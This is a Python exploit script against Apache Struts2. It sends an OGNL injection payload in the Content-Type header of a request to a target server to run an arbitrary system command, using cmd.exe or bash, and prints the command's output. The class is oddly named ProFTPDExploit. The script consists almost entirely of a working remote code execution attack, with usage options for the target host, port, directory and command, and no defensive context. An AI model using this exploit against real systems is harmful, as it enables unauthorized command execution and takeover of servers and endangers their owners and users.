import sys
import requests
from optparse import OptionParser



class ProFTPDExploit:
	def __init__(self, options):
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.rport = options.rport

		#if self.target is not None and self.lport is not None:

		if(len(sys.argv) < 3):
			print('\n python3 exploit.py -h   ...for help')
			print('\n Usage : exploit.py -t RHOST -p RPORT -d Struts-directory -c cmd')

		else:
			proxies='http://127.0.0.1:8080'
			proxies = {'http' : proxies}
			target = 'http://' + self.target #Vulnerable Server
			print(target)
			port = self.rport
			directory = self.directory # Struts Application directory
			cmd = self.command #System Command to be execute

			URL = target + ':' + port + '/' + directory + '/'
#			print(URL)

			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='%s')." % cmd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"

			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
			print(headers)
#			r = requests.get(URL, headers=headers, proxies=proxies)
			r = requests.get(URL, headers=headers)
			print(r.text)



def main():
	parser = OptionParser()
	parser.add_option("-p", "--port", dest="rport", help="RPORT, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	(options, args) = parser.parse_args() 
	exploit = ProFTPDExploit(options) 
if __name__=="__main__": 
	main()
